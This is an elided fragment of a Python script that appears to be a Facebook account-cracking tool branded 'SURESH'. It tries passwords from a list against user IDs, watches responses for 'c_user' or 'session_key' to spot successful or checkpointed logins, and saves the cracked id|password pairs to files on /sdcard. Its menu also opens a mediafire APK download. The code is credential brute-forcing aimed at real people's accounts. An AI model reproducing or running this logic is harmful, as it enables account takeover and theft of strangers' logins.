        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn_VPN1.0.apk/file');menu()

                        elif xd in ['8','08']:

                                os.system('xdg-open https://https://www.facebook.com/profile.php?id=100090297134712');menu()
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [SURESH-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/SURESH-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
                ...
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m [SURESH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [SURESH-OK] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/SURESH-OK.txt','a').write(ids+'|'+pas+'\n')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/SURESH-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [SURESH-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/SURESH-OK.txt','a').write(uid+'|'+pas+'\n')
